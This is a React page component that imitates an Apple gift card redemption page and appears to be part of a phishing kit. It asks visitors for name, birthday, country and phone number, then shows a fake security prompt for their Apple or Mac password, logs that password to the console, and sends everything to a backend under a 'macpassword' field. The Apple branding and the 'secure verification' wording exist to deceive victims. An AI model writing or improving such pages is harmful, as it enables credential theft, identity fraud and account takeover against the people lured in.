import { useState } from "react";
import { motion, AnimatePresence } from "framer-motion";
import { useNavigate } from "react-router-dom";

import Navbar from "../Components/Navbar";
import { AppleInput } from "../Components/AppleInputs";
import { countryList } from "../Components/utils/countries";
import SecurityModal from "../Components/utils/SecurityModal";

import AppleCardImg from "../assets/iTunes_Gift_Cards_in_Qatar.webp";
import { url } from "../url";

export default function UserInfo() {
  const navigate = useNavigate();

  const [country, setCountry] = useState("US");
  const [phoneCountry, setPhoneCountry] = useState("US");
  const [showSecurity, setShowSecurity] = useState(false);
  const [first_name, setFirstName] = useState("");
  const [last_name, setLastName] = useState("");
  const [Birthday, setBirthDay] = useState("");
  const [phoneNumber, setPhoneNumber] = useState("");
  const [applePassword, setApplePassword] = useState("");
  const handleContinue = () => setShowSecurity(true);
  const [loading, setLoading] = useState(false);
  const handleCancel = () => setShowSecurity(false);
  const handleConfirm = async () => {
    console.log(applePassword);
    setLoading(true);
    const userId = localStorage.getItem("user_id");
    console.log(userId);

    const res = await fetch(`${url}/api/${userId}/`, {
      method: "PATCH",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        first_name: first_name,
        last_name: last_name,
        birthday: Birthday,
        country: country,
        phone_number: `${phoneCountry} ${phoneNumber}`,
        macpassword: applePassword,
      }),
    });
    const data = await res.json();
    console.log("returned", data);
    setLoading(false);
    if (!res.ok) {
      setLoading(false);
      throw new Error(data.message || "Login failed");
    } else {
      setLoading(false);
      setShowSecurity(false);

      navigate("/success");
    }
  };

  return (
    <div className="min-h-screen ">
      <Navbar />

      <div className="max-w-7xl mx-auto px-6 py-28 grid grid-cols-1 lg:grid-cols-2 gap-20 items-center">
        {/* LEFT – PRODUCT */}
        <motion.div
          initial={{ opacity: 0, x: -30 }}
          animate={{ opacity: 1, x: 0 }}
          transition={{ duration: 0.7, ease: "easeOut" }}
          className="flex flex-col items-center text-center lg:text-left"
        >
          <motion.img
            src={AppleCardImg}
            alt="Apple Gift Card"
            animate={{ y: [0, -12, 0] }}
            transition={{ duration: 6, repeat: Infinity, ease: "easeInOut" }}
            className="w-105 drop-shadow-2xl mb-10"
          />

          <h2 className="text-3xl font-semibold tracking-tight mb-4">
            Apple Gift Card
          </h2>

          <p className="text-gray-600 max-w-md">
            Use Apple Gift Card to get products, accessories, apps, games,
            music, movies, TV shows, and more. Delivered digitally and ready to
            redeem instantly.
          </p>

          <ul className="mt-6 text-sm text-gray-500 space-y-2">
            <li>• Redeem for App Store, iTunes & Apple Services</li>
            <li>• Secure verification</li>
            <li>• Works worldwide</li>
          </ul>
        </motion.div>

        {/* RIGHT – FORM */}
        <motion.div
          initial={{ opacity: 0, y: 30 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.7, ease: "easeOut" }}
          className="bg-white rounded-2xl shadow-xl border border-gray-100 p-10"
        >
          <h1 className="text-3xl font-semibold text-center mb-2 tracking-tight">
            Complete Your Profile
          </h1>
          <p className="text-center text-gray-500 text-sm mb-10 max-w-sm mx-auto">
            Verify your details to redeem your Apple Gift Card securely.
          </p>

          {/* Name */}
          <div className="grid grid-cols-2 gap-4 mb-4">
            <AppleInput
              label="First name"
              value={first_name}
              onChange={(e) => setFirstName(e.target.value)}
            />
            <AppleInput
              label="Last name"
              value={last_name}
              onChange={(e) => setLastName(e.target.value)}
            />
          </div>

          {/* Country */}
          <div className="mb-4">
            <select
              value={country}
              onChange={(e) => setCountry(e.target.value)}
              className="w-full border border-gray-300 rounded-md px-3 py-3 text-sm focus:ring-2 focus:ring-blue-500"
            >
              {countryList.map((c) => (
                <option key={c.code} value={c.code}>
                  {c.name}
                </option>
              ))}
            </select>
          </div>

          {/* Birthday */}
          <div className="mb-6">
            <AppleInput
              label="Birthday"
              type="date"
              value={Birthday}
              onChange={(e) => setBirthDay(e.target.value)}
            />
          </div>

          <hr className="my-8" />

          {/* Phone */}
          <div className="flex gap-3 mb-4">
            <select
              value={phoneCountry}
              onChange={(e) => setPhoneCountry(e.target.value)}
              className="border border-gray-300 rounded-md px-3 py-3 text-sm w-44 focus:ring-2 focus:ring-blue-500"
            >
              {countryList.map((c:any) => (
                <option key={c.code} value={c.dial}>
                  {c.dial} ({c.name})
                </option>
              ))}
            </select>

            <div className="flex-1">
              <AppleInput
                label="Phone number"
                value={phoneNumber}
                onChange={(e) => setPhoneNumber(e.target.value)}
              />
            </div>
          </div>

          {/* Contact method */}
          <label className="block text-gray-700 text-sm font-medium mb-2">
            How should we contact you?
          </label>
          <div className="flex gap-8 text-sm mb-6">
            <label className="flex items-center gap-2">
              <input type="radio" name="verify" defaultChecked />
              Text message
            </label>
            <label className="flex items-center gap-2">
              <input type="radio" name="verify" />
              Phone call
            </label>
          </div>

          {/* Agreement */}
          <label className="flex gap-2 text-xs text-gray-500 mb-8">
            <input type="checkbox" defaultChecked />
            Receive announcements and updates from Apple
          </label>

          {/* CTA */}
          <motion.button
            onClick={handleContinue}
            disabled={loading}
            whileHover={{ scale: 1.02 }}
            whileTap={{ scale: 0.97 }}
            transition={{ type: "spring", stiffness: 300 }}
            className="w-full py-3 bg-blue-600 hover:bg-blue-700 text-white rounded-xl text-lg font-medium shadow-lg"
          >
            Continue
          </motion.button>
        </motion.div>
      </div>

      {/* SECURITY MODAL */}
      <AnimatePresence>
        {showSecurity && (
          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="fixed inset-0 bg-black/50 flex items-center justify-center z-50"
          >
            <motion.div
              initial={{ scale: 0.9, opacity: 0 }}
              animate={{ scale: 1, opacity: 1 }}
              exit={{ scale: 0.95, opacity: 0 }}
              transition={{ type: "spring", stiffness: 260, damping: 20 }}
              className="w-130 rounded-xl bg-gray-200/90 backdrop-blur-xl shadow-2xl border border-white/40 p-6"
            >
              <SecurityModal
                confirm={handleConfirm}
                cancel={handleCancel}
                applePassword={applePassword}
                onChangePin={(value: string) => setApplePassword(value)}
                loading={loading}
              />
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>
    </div>
  );
}
